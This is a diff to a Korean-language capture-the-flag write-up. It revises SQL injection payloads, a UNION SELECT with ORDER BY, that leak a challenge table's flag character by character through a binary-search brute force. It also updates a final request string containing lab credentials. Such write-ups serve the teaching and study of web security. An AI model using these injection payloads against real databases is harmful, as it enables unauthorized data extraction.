@@ -61,7 +61,7 @@ SELECT * FROM findflag_2 WHERE $id_column='' union select 1,flag,3,4,5 from(sele
 
 따라서 UI에 한번에 출력하는 방법말고 브루트포싱하여 한글자씩 가져오는 방법을 생각해보았다.
  
-SELECT * FROM findflag_2 WHERE $id_column='zairowkdlfhdkel' union select 1,2,3,4 'a',5 order by 4 asc %23
+SELECT * FROM findflag_2 WHERE $id_column='zairowkdlfhdkel' union select 1,2,3,'a',5 order by 4 asc %23
 
 위와 같이 예제 코드가 있는데
 위 쿼리를 이용하면 findflag_2의 네번째 속성인 flag의 첫번째 자리 값이 'a' 보다 큰값인지 작은 값인지 확인 할 수 있다.
@@ -85,4 +85,5 @@ flag[i] 값이 pivot 보다 더 낮거나 같으면 id 출력
 flag[i] 값이 pivot 보다 더 크면 2 출력 
 최종적으로 start가 end랑 똑같아지면 그게 flag값이다!
 
-?id=zairowkdlfhdkel&pw=wkdlfhpw%21%21@%25%25%23@@%23&flag=OWKG%27
+?id=zairowkdlfhdkel&pw=wkdlfhpw%21%21@%25%25%23@@%23&flag=k
+
